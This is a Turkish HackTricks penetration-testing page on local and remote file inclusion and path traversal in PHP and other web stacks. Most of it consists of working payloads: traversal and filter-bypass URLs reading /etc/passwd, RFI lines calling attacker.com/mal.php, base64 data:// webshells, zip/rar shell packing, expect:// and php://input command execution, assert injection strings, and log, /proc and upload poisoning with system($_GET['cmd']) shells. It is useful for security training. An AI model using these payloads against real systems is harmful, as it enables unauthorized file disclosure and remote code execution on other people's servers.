# Dosya Dahil Etme/Yol Traversali

{% hint style="success" %}
AWS Hacking'i öğrenin ve pratik yapın:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Eğitim AWS Kırmızı Takım Uzmanı (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i öğrenin ve pratik yapın: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Eğitim GCP Kırmızı Takım Uzmanı (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter'da** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**'i takip edin.**
* **Hacking ipuçlarını paylaşmak için** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gönderin.

</details>
{% endhint %}

<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

Deneyimli hackerlar ve bug bounty avcıları ile iletişim kurmak için [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) sunucusuna katılın!

**Hacking İçgörüleri**\
Hacking'in heyecanı ve zorluklarına dalan içeriklerle etkileşimde bulunun

**Gerçek Zamanlı Hack Haberleri**\
Gerçek zamanlı haberler ve içgörülerle hızlı tempolu hacking dünyasında güncel kalın

**Son Duyurular**\
Yeni başlayan bug bounty'ler ve önemli platform güncellemeleri hakkında bilgi sahibi olun

Bugün [**Discord**](https://discord.com/invite/N3FrSbmwdy) üzerinden bize katılın ve en iyi hackerlarla işbirliği yapmaya başlayın!

## Dosya Dahil Etme

**Uzaktan Dosya Dahil Etme (RFI):** Dosya uzaktan bir sunucudan yüklenir (En İyi: Kodu yazabilirsiniz ve sunucu bunu çalıştırır). PHP'de bu varsayılan olarak **devre dışı**dır (**allow\_url\_include**).\
**Yerel Dosya Dahil Etme (LFI):** Sunucu yerel bir dosyayı yükler.

Zafiyet, kullanıcının sunucu tarafından yüklenecek dosyayı bir şekilde kontrol edebilmesi durumunda ortaya çıkar.

Zayıf **PHP fonksiyonları**: require, require\_once, include, include\_once

Bu zafiyeti istismar etmek için ilginç bir araç: [https://github.com/kurobeats/fimap](https://github.com/kurobeats/fimap)

## Blind - İlginç - LFI2RCE dosyaları
```python
wfuzz -c -w ./lfi2.txt --hw 0 http://10.10.10.10/nav.php?page=../../../../../../../FUZZ
```
### **Linux**

**Birçok \*nix LFI listesini birleştirip daha fazla yol ekleyerek bunu oluşturdum:**

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt" %}

Ayrıca `/`'ı `\` ile değiştirmeyi deneyin.\
Ayrıca `../../../../../` eklemeyi deneyin.

Vulnerabilitenin var olup olmadığını kontrol etmek için /etc/password dosyasını bulmak için çeşitli teknikler kullanan bir liste [burada](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-nix.txt) bulunabilir.

### **Windows**

Farklı kelime listelerinin birleştirilmesi:

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt" %}

Ayrıca `/`'ı `\` ile değiştirmeyi deneyin.\
Ayrıca `C:/`'ı kaldırmayı ve `../../../../../` eklemeyi deneyin.

Vulnerabilitenin var olup olmadığını kontrol etmek için /boot.ini dosyasını bulmak için çeşitli teknikler kullanan bir liste [burada](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-win.txt) bulunabilir.

### **OS X**

Linux'un LFI listesini kontrol edin.

## Temel LFI ve atlatmalar

Tüm örnekler Yerel Dosya Dahil Etme için geçerlidir ancak Uzaktan Dosya Dahil Etme için de uygulanabilir (sayfa=[http://myserver.com/phpshellcode.txt\\](http://myserver.com/phpshellcode.txt\)/).
```
http://example.com/index.php?page=../../../etc/passwd
```
### traversal sequences stripped non-recursively
```python
http://example.com/index.php?page=....//....//....//etc/passwd
http://example.com/index.php?page=....\/....\/....\/etc/passwd
http://some.domain.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
```
### **Null byte (%00)**

Verilen dizeye daha fazla karakter ekleme işlemini atlatın (atlatma: $\_GET\['param']."php")
```
http://example.com/index.php?page=../../../etc/passwd%00
```
Bu, **PHP 5.4'ten beri çözüldü**

### **Kodlama**

Çift URL kodlaması (ve diğerleri) gibi standart dışı kodlamalar kullanabilirsiniz:
```
http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
http://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```
### Mevcut klasörden

Belki de arka uç klasör yolunu kontrol ediyor:
```python
http://example.com/index.php?page=utils/scripts/../../../../../etc/passwd
```
### Sunucu Üzerinde Dosya Sistemi Dizinlerini Keşfetme

Bir sunucunun dosya sistemi, belirli teknikler kullanılarak yalnızca dosyaları değil, dizinleri de tanımlamak için özyinelemeli olarak keşfedilebilir. Bu süreç, dizin derinliğini belirlemeyi ve belirli klasörlerin varlığını sorgulamayı içerir. Bunu başarmak için aşağıda ayrıntılı bir yöntem bulunmaktadır:

1. **Dizin Derinliğini Belirleme:** Mevcut dizininizin derinliğini, `/etc/passwd` dosyasını başarıyla alarak belirleyin (sunucu Linux tabanlıysa geçerlidir). Örnek bir URL, üç derinliği belirten aşağıdaki gibi yapılandırılabilir:
```bash
http://example.com/index.php?page=../../../etc/passwd # depth of 3
```
2. **Klasörleri Sorgula:** Şüpheli klasörün adını (örneğin, `private`) URL'ye ekleyin, ardından `/etc/passwd`'a geri gidin. Ek dizin seviyesi derinliği bir artırmayı gerektirir:
```bash
http://example.com/index.php?page=private/../../../../etc/passwd # depth of 3+1=4
```
3. **Sonuçları Yorumlayın:** Sunucunun yanıtı, klasörün var olup olmadığını gösterir:
* **Hata / Çıktı Yok:** `private` klasörü muhtemelen belirtilen konumda mevcut değildir.
* **`/etc/passwd` İçeriği:** `private` klasörünün varlığı doğrulanmıştır.
4. **Kapsamlı Keşif:** Bulunan klasörler, aynı teknik veya geleneksel Yerel Dosya Dahil Etme (LFI) yöntemleri kullanılarak alt dizinler veya dosyalar için daha fazla araştırılabilir.

Dosya sistemindeki farklı konumlarda dizinleri keşfetmek için yükü buna göre ayarlayın. Örneğin, `/var/www/` içinde bir `private` dizini olup olmadığını kontrol etmek için (mevcut dizinin derinliği 3 olarak varsayıldığında) şunu kullanın:
```bash
http://example.com/index.php?page=../../../var/www/private/../../../etc/passwd
```
### **Path Truncation Technique**

Path truncation, web uygulamalarında dosya yollarını manipüle etmek için kullanılan bir yöntemdir. Genellikle, dosya yollarının sonuna ek karakterler ekleyen belirli güvenlik önlemlerini atlayarak kısıtlı dosyalara erişmek için kullanılır. Amaç, güvenlik önlemi tarafından değiştirildiğinde bile istenen dosyaya işaret eden bir dosya yolu oluşturmaktır.

PHP'de, dosya yolu için çeşitli temsiller dosya sisteminin doğası gereği eşdeğer olarak kabul edilebilir. Örneğin:

* `/etc/passwd`, `/etc//passwd`, `/etc/./passwd` ve `/etc/passwd/` hepsi aynı yol olarak değerlendirilir.
* Son 6 karakter `passwd` olduğunda, bir `/` eklemek (bunu `passwd/` yaparak) hedef dosyayı değiştirmez.
* Benzer şekilde, bir dosya yoluna `.php` eklenirse (örneğin `shellcode.php`), sonuna `/.` eklemek erişilen dosyayı değiştirmeyecektir.

Verilen örnekler, hassas içeriği (kullanıcı hesap bilgileri) nedeniyle yaygın bir hedef olan `/etc/passwd`'a erişmek için yol kısaltmasını nasıl kullanacağınızı göstermektedir:
```
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd......[ADD MORE]....
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd/././.[ADD MORE]/././.
```

```
http://example.com/index.php?page=a/./.[ADD MORE]/etc/passwd
http://example.com/index.php?page=a/../../../../[ADD MORE]../../../../../etc/passwd
```
Bu senaryolarda, gereken geçiş sayısı yaklaşık 2027 civarında olabilir, ancak bu sayı sunucunun yapılandırmasına bağlı olarak değişebilir.

* **Nokta Segmentleri ve Ekstra Karakterler Kullanma**: Geçiş dizileri (`../`) ek nokta segmentleri ve karakterlerle birleştirilerek dosya sisteminde gezinmek için kullanılabilir, böylece sunucu tarafından eklenen dizgiler etkili bir şekilde göz ardı edilir.
* **Gerekli Geçiş Sayısını Belirleme**: Deneme yanılma yoluyla, kök dizine ve ardından `/etc/passwd`'a gitmek için gereken `../` dizilerinin kesin sayısını bulmak mümkündür, böylece eklenen dizgiler (örneğin `.php`) etkisiz hale getirilirken istenen yol (`/etc/passwd`) sağlam kalır.
* **Sahte Bir Dizinle Başlama**: Yolu var olmayan bir dizinle (örneğin `a/`) başlatmak yaygın bir uygulamadır. Bu teknik, bir önlem olarak veya sunucunun yol ayrıştırma mantığının gereksinimlerini karşılamak için kullanılır.

Yol kısaltma teknikleri kullanırken, sunucunun yol ayrıştırma davranışını ve dosya sistemi yapısını anlamak çok önemlidir. Her senaryo farklı bir yaklaşım gerektirebilir ve en etkili yöntemi bulmak için test yapmak genellikle gereklidir.

**Bu zafiyet PHP 5.3'te düzeltildi.**

### **Filtre atlatma hileleri**
```
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
Maintain the initial path: http://example.com/index.php?page=/var/www/../../etc/passwd
http://example.com/index.php?page=PhP://filter
```
## Remote File Inclusion

PHP'de bu varsayılan olarak devre dışıdır çünkü **`allow_url_include`** **Kapalıdır.** Bunun çalışması için **Açık** olması gerekir ve bu durumda sunucunuzdan bir PHP dosyası dahil edebilir ve RCE elde edebilirsiniz:
```python
http://example.com/index.php?page=http://atacker.com/mal.php
http://example.com/index.php?page=\\attacker.com\shared\mal.php
```
Eğer bir sebepten dolayı **`allow_url_include`** **Açık** ise, ancak PHP dış web sayfalarına erişimi **filtreliyorsa**, [bu gönderiye](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64/) göre, örneğin base64 ile b64 PHP kodunu çözmek ve RCE elde etmek için veri protokolünü kullanabilirsiniz:

{% code overflow="wrap" %}
```
PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.txt
```
{% endcode %}

{% hint style="info" %}
Önceki kodda, son `+.txt` eklendi çünkü saldırganın `.txt` ile biten bir dizeye ihtiyacı vardı, bu yüzden dize bununla bitiyor ve b64 decode'dan sonra o kısım sadece gereksiz bir şey döndürecek ve gerçek PHP kodu dahil edilecek (ve dolayısıyla, çalıştırılacak).
{% endhint %}

Başka bir örnek **`php://` protokolünü kullanmayan**:

{% code overflow="wrap" %}
```
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+txt
```
{% endcode %}

## Python Kök Elemanı

Python'da bu gibi bir kodda:
```python
# file_name is controlled by a user
os.path.join(os.getcwd(), "public", file_name)
```
Eğer kullanıcı **`file_name`** için **mutlak bir yol** geçirirse, **önceki yol sadece kaldırılır**:
```python
os.path.join(os.getcwd(), "public", "/etc/passwd")
'/etc/passwd'
```
Bu, [belgelere](https://docs.python.org/3.10/library/os.path.html#os.path.join) göre beklenen davranıştır:

> Eğer bir bileşen mutlak bir yol ise, tüm önceki bileşenler atılır ve birleştirme mutlak yol bileşeninden devam eder.

## Java Dizinlerini Listele

Java'da bir Path Traversal varsa ve **bir dosya yerine bir dizin isterseniz**, **dizinin bir listesi döndürülür**. Bu, diğer dillerde (bildiğim kadarıyla) olmayacaktır.

## En İyi 25 parametre

Yerel dosya dahil etme (LFI) zafiyetlerine karşı savunmasız olabilecek en iyi 25 parametrenin listesi ( [bağlantıdan](https://twitter.com/trbughunters/status/1279768631845494787)):
```
?cat={payload}
?dir={payload}
?action={payload}
?board={payload}
?date={payload}
?detail={payload}
?file={payload}
?download={payload}
?path={payload}
?folder={payload}
?prefix={payload}
?include={payload}
?page={payload}
?inc={payload}
?locate={payload}
?show={payload}
?doc={payload}
?site={payload}
?type={payload}
?view={payload}
?content={payload}
?document={payload}
?layout={payload}
?mod={payload}
?conf={payload}
```
## LFI / RFI using PHP wrappers & protocols

### php://filter

PHP filtreleri, veriler **okunmadan veya yazılmadan önce temel değişiklik işlemleri** gerçekleştirmeye olanak tanır. 5 filtre kategorisi vardır:

* [String Filters](https://www.php.net/manual/en/filters.string.php):
* `string.rot13`
* `string.toupper`
* `string.tolower`
* `string.strip_tags`: Verilerden etiketleri kaldırır ("<" ve ">" karakterleri arasındaki her şey)
* Bu filtrenin modern PHP sürümlerinden kaybolduğunu unutmayın.
* [Conversion Filters](https://www.php.net/manual/en/filters.convert.php)
* `convert.base64-encode`
* `convert.base64-decode`
* `convert.quoted-printable-encode`
* `convert.quoted-printable-decode`
* `convert.iconv.*` : Farklı bir kodlamaya dönüştürür (`convert.iconv.<input_enc>.<output_enc>`). **Desteklenen tüm kodlamaların listesini** almak için konsolda şunu çalıştırın: `iconv -l`

{% hint style="warning" %}
`convert.iconv.*` dönüşüm filtresini kötüye kullanarak **rastgele metin** üretebilirsiniz, bu da rastgele metin yazmak veya bir işlev gibi dahil etme işlemini rastgele metin yapmak için yararlı olabilir. Daha fazla bilgi için [**LFI2RCE via php filters**](lfi2rce-via-php-filters.md) sayfasına bakın.
{% endhint %}

* [Compression Filters](https://www.php.net/manual/en/filters.compression.php)
* `zlib.deflate`: İçeriği sıkıştırır (çok fazla bilgi sızdırırken yararlıdır)
* `zlib.inflate`: Verileri açar
* [Encryption Filters](https://www.php.net/manual/en/filters.encryption.php)
* `mcrypt.*` : Kullanımdan kaldırıldı
* `mdecrypt.*` : Kullanımdan kaldırıldı
* Diğer Filtreler
* php'de `var_dump(stream_get_filters());` çalıştırarak birkaç **beklenmedik filtre** bulabilirsiniz:
* `consumed`
* `dechunk`: HTTP parçalı kodlamasını tersine çevirir
* `convert.*`
```php
# String Filters
## Chain string.toupper, string.rot13 and string.tolower reading /etc/passwd
echo file_get_contents("php://filter/read=string.toupper|string.rot13|string.tolower/resource=file:///etc/passwd");
## Same chain without the "|" char
echo file_get_contents("php://filter/string.toupper/string.rot13/string.tolower/resource=file:///etc/passwd");
## string.string_tags example
echo file_get_contents("php://filter/string.strip_tags/resource=data://text/plain,<b>Bold</b><?php php code; ?>lalalala");

# Conversion filter
## B64 decode
echo file_get_contents("php://filter/convert.base64-decode/resource=data://plain/text,aGVsbG8=");
## Chain B64 encode and decode
echo file_get_contents("php://filter/convert.base64-encode|convert.base64-decode/resource=file:///etc/passwd");
## convert.quoted-printable-encode example
echo file_get_contents("php://filter/convert.quoted-printable-encode/resource=data://plain/text,£hellooo=");
=C2=A3hellooo=3D
## convert.iconv.utf-8.utf-16le
echo file_get_contents("php://filter/convert.iconv.utf-8.utf-16le/resource=data://plain/text,trololohellooo=");

# Compresion Filter
## Compress + B64
echo file_get_contents("php://filter/zlib.deflate/convert.base64-encode/resource=file:///etc/passwd");
readfile('php://filter/zlib.inflate/resource=test.deflated'); #To decompress the data locally
# note that PHP protocol is case-inselective (that's mean you can use "PhP://" and any other varient)
```
{% hint style="warning" %}
"php://filter" kısmı büyük/küçük harf duyarsızdır
{% endhint %}

### Rastgele dosyaları okumak için php filtrelerini oracle olarak kullanma

[**Bu yazıda**](https://www.synacktiv.com/publications/php-filter-chains-file-read-from-error-based-oracle) sunulan bir teknik, sunucudan geri dönen çıktıyı almadan yerel bir dosyayı okumayı öneriyor. Bu teknik, **php filtrelerini oracle olarak kullanarak dosyanın boolean sızdırılması (karakter karakter)** üzerine kuruludur. Bunun nedeni, php filtrelerinin bir metni yeterince büyütmek için kullanılabilmesidir, böylece php bir istisna fırlatır.

Orijinal yazıda tekniğin detaylı bir açıklamasını bulabilirsiniz, ancak burada hızlı bir özet:

* Metnin başındaki karakteri bırakmak ve dize boyutunu üssel olarak artırmak için **`UCS-4LE`** codec'ini kullanın.
* Bu, **ilk harf doğru tahmin edildiğinde o kadar büyük bir metin oluşturmak için** kullanılacak ki php bir **hata** tetikleyecektir.
* **Dechunk** filtresi, **ilk karakter bir onaltılık değilse her şeyi kaldıracaktır**, böylece ilk karakterin onaltılık olup olmadığını bilebiliriz.
* Bu, önceki ile birleştirildiğinde (ve tahmin edilen harfe bağlı diğer filtrelerle), metnin başındaki bir harfi tahmin etmemizi sağlayacaktır; çünkü yeterince dönüşüm yaptığımızda onaltılık bir karakter olmaktan çıkacaktır. Çünkü eğer onaltılıksa, dechunk onu silmeyecek ve başlangıç bombası php hatası oluşturacaktır.
* **convert.iconv.UNICODE.CP930** codec'i her harfi bir sonrakine dönüştürür (bu codec'ten sonra: a -> b). Bu, ilk harfin `a` olup olmadığını keşfetmemizi sağlar; çünkü bu codec'in 6'sını uygularsak a->b->c->d->e->f->g harfi artık onaltılık bir karakter değildir, bu nedenle dechunk onu silmez ve php hatası başlangıç bombası ile tetiklenir.
* Başlangıçta **rot13** gibi diğer dönüşümler kullanarak n, o, p, q, r gibi diğer karakterleri sızdırmak mümkündür (ve diğer codec'ler, diğer harfleri onaltılık aralığına taşımak için kullanılabilir).
* İlk karakter bir sayı olduğunda, bunu base64 kodlaması yapmak ve sayıyı sızdırmak için ilk 2 harfi sızdırmak gerekir.
* Son sorun, **ilk harften daha fazlasını nasıl sızdıracağınızı** görmektir. **convert.iconv.UTF16.UTF-16BE, convert.iconv.UCS-4.UCS-4LE, convert.iconv.UCS-4.UCS-4LE** gibi sıralı bellek filtreleri kullanarak karakterlerin sırasını değiştirmek ve metnin ilk pozisyonuna diğer harfleri almak mümkündür.
* Ve **daha fazla veri** elde edebilmek için fikir, **başlangıçta 2 bayt çöp verisi oluşturmak** ve **convert.iconv.UTF16.UTF16** ile uygulamak, ardından **UCS-4LE** ile bunu **sonraki 2 baytla pivotlamak** ve **çöp veriye kadar veriyi silmek** (bu, başlangıç metninin ilk 2 baytını kaldıracaktır). İstenilen sızıntı bitine ulaşana kadar bunu yapmaya devam edin.

Yazıda bunu otomatik olarak gerçekleştiren bir araç da sızdırılmıştır: [php\_filters\_chain\_oracle\_exploit](https://github.com/synacktiv/php_filter_chains_oracle_exploit).

### php://fd

Bu sarmalayıcı, işlemin açık olan dosya tanımlayıcılarına erişim sağlar. Açık dosyaların içeriğini sızdırmak için potansiyel olarak yararlıdır:
```php
echo file_get_contents("php://fd/3");
$myfile = fopen("/etc/passwd", "r");
```
**php://stdin, php://stdout ve php://stderr** kullanarak sırasıyla **dosya tanımlayıcıları 0, 1 ve 2**'ye erişebilirsiniz (bir saldırıda bunun nasıl faydalı olabileceğinden emin değilim)

### zip:// ve rar://

İçinde bir PHPShell bulunan bir Zip veya Rar dosyası yükleyin ve erişin.\
Rar protokolünü kötüye kullanabilmek için **özellikle etkinleştirilmesi gerekir**.
```bash
echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;
zip payload.zip payload.php;
mv payload.zip shell.jpg;
rm payload.php

http://example.com/index.php?page=zip://shell.jpg%23payload.php

# To compress with rar
rar a payload.rar payload.php;
mv payload.rar shell.jpg;
rm payload.php
http://example.com/index.php?page=rar://shell.jpg%23payload.php
```
### data://
```
http://example.net/?page=data://text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data://text/plain,<?php phpinfo(); ?>
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
http://example.net/?page=data:text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data:text/plain,<?php phpinfo(); ?>
http://example.net/?page=data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
Not edin ki bu protokol php yapılandırmaları **`allow_url_open`** ve **`allow_url_include`** ile kısıtlanmıştır.

### expect://

Expect etkinleştirilmelidir. Bunu kullanarak kod çalıştırabilirsiniz:
```
http://example.com/index.php?page=expect://id
http://example.com/index.php?page=expect://ls
```
### input://

POST parametrelerinde yükünüzü belirtin:
```bash
curl -XPOST "http://example.com/index.php?page=php://input" --data "<?php system('id'); ?>"
```
### phar://

Bir `.phar` dosyası, bir web uygulaması dosya yükleme için `include` gibi fonksiyonlar kullandığında PHP kodu çalıştırmak için kullanılabilir. Aşağıda verilen PHP kodu, bir `.phar` dosyasının oluşturulmasını göstermektedir:
```php
<?php
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); system("ls"); ?>');
$phar->stopBuffering();
```
`.phar` dosyasını derlemek için aşağıdaki komut çalıştırılmalıdır:
```bash
php --define phar.readonly=0 create_path.php
```
Upon execution, a file named `test.phar` will be created, which could potentially be leveraged to exploit Local File Inclusion (LFI) vulnerabilities.

LFI yalnızca dosya okuma işlemi yapıyorsa ve içindeki PHP kodunu çalıştırmıyorsa, `file_get_contents()`, `fopen()`, `file()`, `file_exists()`, `md5_file()`, `filemtime()`, veya `filesize()` gibi fonksiyonlar aracılığıyla bir deserialization açığı istismar edilmeye çalışılabilir. Bu açık, `phar` protokolü kullanılarak dosyaların okunmasıyla ilişkilidir.

`.phar` dosyaları bağlamında deserialization açıklarını istismar etmeyi anlamak için aşağıdaki belgede yer alan bilgilere başvurun:

[Phar Deserialization Exploitation Guide](phar-deserialization.md)

{% content-ref url="phar-deserialization.md" %}
[phar-deserialization.md](phar-deserialization.md)
{% endcontent-ref %}

### CVE-2024-2961

**php filtrelerini destekleyen herhangi bir dosyanın okunmasını** kötüye kullanarak RCE elde etmek mümkündü. Ayrıntılı açıklama [**bu yazıda bulunabilir**](https://www.ambionics.io/blog/iconv-cve-2024-2961-p1)**.**\
Çok hızlı özet: PHP yığınında bir **3 bayt taşması** kötüye kullanılarak **belirli boyuttaki serbest parçaların zinciri** değiştirildi ve böylece **herhangi bir adrese yazma** imkanı sağlandı, bu nedenle **`system`** çağrısı yapmak için bir hook eklendi.\
Daha fazla php filtresi kötüye kullanılarak belirli boyutlarda parçalar tahsis etmek mümkündü.

### Daha fazla protokol

Burada dahil edilebilecek daha fazla [**protokolü kontrol edin**](https://www.php.net/manual/en/wrappers.php)**:**

* [php://memory and php://temp](https://www.php.net/manual/en/wrappers.php.php#wrappers.php.memory) — Belleğe veya geçici bir dosyaya yazma (bu dosya dahil etme saldırısında nasıl faydalı olabileceğinden emin değilim)
* [file://](https://www.php.net/manual/en/wrappers.file.php) — Yerel dosya sistemine erişim
* [http://](https://www.php.net/manual/en/wrappers.http.php) — HTTP(s) URL'lerine erişim
* [ftp://](https://www.php.net/manual/en/wrappers.ftp.php) — FTP(s) URL'lerine erişim
* [zlib://](https://www.php.net/manual/en/wrappers.compression.php) — Sıkıştırma Akışları
* [glob://](https://www.php.net/manual/en/wrappers.glob.php) — Desene uyan yol adlarını bulma (Hiçbir yazdırılabilir şey döndürmez, bu nedenle burada pek faydalı değildir)
* [ssh2://](https://www.php.net/manual/en/wrappers.ssh2.php) — Güvenli Shell 2
* [ogg://](https://www.php.net/manual/en/wrappers.audio.php) — Ses akışları (Rastgele dosyaları okumak için faydalı değil)

## PHP'nin 'assert' ile LFI

PHP'deki Local File Inclusion (LFI) riskleri, dizin geçiş karakterleri gibi ".." içeren girişlerin kontrol edildiği ancak düzgün bir şekilde temizlenmediği durumlarda, 'assert' fonksiyonu ile çalışırken oldukça yüksektir.

Örneğin, PHP kodu dizin geçişini önlemek için şu şekilde tasarlanmış olabilir:
```bash
assert("strpos('$file', '..') === false") or die("");
```
Bu, geçişi durdurmayı amaçlasa da, istemeden kod enjeksiyonu için bir vektör oluşturur. Dosya içeriğini okumak için bunu istismar etmek isteyen bir saldırgan şunları kullanabilir:
```plaintext
' and die(highlight_file('/etc/passwd')) or '
```
Benzer şekilde, rastgele sistem komutlarını çalıştırmak için şunlar kullanılabilir:
```plaintext
' and die(system("id")) or '
```
Önemli olan **bu yükleri URL-encode etmektir**.

<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

Deneyimli hackerlar ve bug bounty avcıları ile iletişim kurmak için [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) sunucusuna katılın!

**Hacking İçgörüleri**\
Hacking'in heyecanı ve zorluklarına dalan içeriklerle etkileşimde bulunun

**Gerçek Zamanlı Hack Haberleri**\
Gerçek zamanlı haberler ve içgörülerle hızlı tempolu hacking dünyasında güncel kalın

**Son Duyurular**\
Yeni başlayan bug bounty'ler ve kritik platform güncellemeleri hakkında bilgi sahibi olun

Bugün [**Discord**](https://discord.com/invite/N3FrSbmwdy) üzerinden bize katılın ve en iyi hackerlarla işbirliğine başlayın!

## PHP Blind Path Traversal

{% hint style="warning" %}
Bu teknik, bir **PHP fonksiyonu** tarafından **bir dosyaya erişim** sağladığınız ancak dosyanın içeriğini göremediğiniz (örneğin, **`file()`** fonksiyonuna basit bir çağrı gibi) durumlarda geçerlidir.
{% endhint %}

[**bu harika yazıda**](https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle.html) bir blind path traversal'ın PHP filtresi aracılığıyla **bir hata oracle'ı üzerinden bir dosyanın içeriğini dışarı sızdırmak için nasıl kötüye kullanılabileceği** açıklanmaktadır.

Özetle, teknik, bir dosyanın içeriğini o kadar **büyük** yapmak için **"UCS-4LE" kodlamasını** kullanmaktadır ki, dosyayı açan **PHP fonksiyonu** bir **hata** tetikleyecektir.

Daha sonra, ilk karakteri sızdırmak için filtre **`dechunk`** kullanılır ve diğerleriyle birlikte **base64** veya **rot13** gibi filtreler kullanılır ve nihayetinde filtreler **convert.iconv.UCS-4.UCS-4LE** ve **convert.iconv.UTF16.UTF-16BE** kullanılarak **diğer karakterler başa yerleştirilir ve sızdırılır**.

**Zayıf olabilecek fonksiyonlar**: `file_get_contents`, `readfile`, `finfo->file`, `getimagesize`, `md5_file`, `sha1_file`, `hash_file`, `file`, `parse_ini_file`, `copy`, `file_put_contents (sadece hedef okuma için bunu kullanın)`, `stream_get_contents`, `fgets`, `fread`, `fgetc`, `fgetcsv`, `fpassthru`, `fputs`

Teknik detaylar için belirtilen yazıya bakın!

## LFI2RCE

### Uzaktan Dosya Dahil Etme

Daha önce açıklandığı gibi, [**bu bağlantıyı takip edin**](./#remote-file-inclusion).

### Apache/Nginx log dosyası aracılığıyla

Eğer Apache veya Nginx sunucusu **LFI'ye karşı zayıfsa**, dahil etme fonksiyonu içinde **`/var/log/apache2/access.log` veya `/var/log/nginx/access.log`** dosyasına erişmeye çalışabilirsiniz, **kullanıcı ajanı** içinde veya bir **GET parametresi** içinde **`<?php system($_GET['c']); ?>`** gibi bir php shell ayarlayıp o dosyayı dahil edebilirsiniz.

{% hint style="warning" %}
Shell için **çift tırnak** kullanıyorsanız, **basit tırnaklar** yerine, çift tırnaklar "_**quote;**_" dizesi için değiştirilecektir, **PHP burada bir hata verecektir** ve **başka hiçbir şey çalıştırılmayacaktır**.

Ayrıca, **yükü doğru yazdığınızdan emin olun** yoksa PHP, log dosyasını yüklemeye çalıştığında her seferinde hata verecektir ve ikinci bir fırsatınız olmayacaktır.
{% endhint %}

Bu, diğer loglarda da yapılabilir ama **dikkatli olun**, loglardaki kod URL encode edilmiş olabilir ve bu Shell'i bozabilir. **Authorization "basic"** başlığı, Base64'te "user:password" içerir ve loglar içinde çözülür. PHPShell bu başlık içine yerleştirilebilir.\
Diğer olası log yolları:
```python
/var/log/apache2/access.log
/var/log/apache/access.log
/var/log/apache2/error.log
/var/log/apache/error.log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/httpd/error_log
```
Fuzzing wordlist: [https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)

### E-posta ile

**Bir e-posta gönderin** iç hesap (user@localhost) içeren PHP yüklemeniz gibi `<?php echo system($_REQUEST["cmd"]); ?>` ve kullanıcı e-postasına dahil etmeye çalışın bir yol ile **`/var/mail/<USERNAME>`** veya **`/var/spool/mail/<USERNAME>`**

### /proc/\*/fd/\* ile

1. Birçok shell yükleyin (örneğin: 100)
2. [http://example.com/index.php?page=/proc/$PID/fd/$FD](http://example.com/index.php?page=/proc/$PID/fd/$FD) dahil edin, $PID = sürecin PID'si (brute force ile bulunabilir) ve $FD dosya tanımlayıcısı (brute force ile bulunabilir)

### /proc/self/environ ile

Bir log dosyası gibi, yüklemeyi User-Agent içinde gönderin, /proc/self/environ dosyası içinde yansıtılacaktır.
```
GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
User-Agent: <?=phpinfo(); ?>
```
### Via upload

Eğer bir dosya yükleyebiliyorsanız, sadece shell yükünü içine enjekte edin (örneğin: `<?php system($_GET['c']); ?>`).
```
http://example.com/index.php?page=path/to/uploaded/file.png
```
Dosyanın okunabilirliğini korumak için, resimlerin/doc/pdf'nin meta verilerine enjekte etmek en iyisidir.

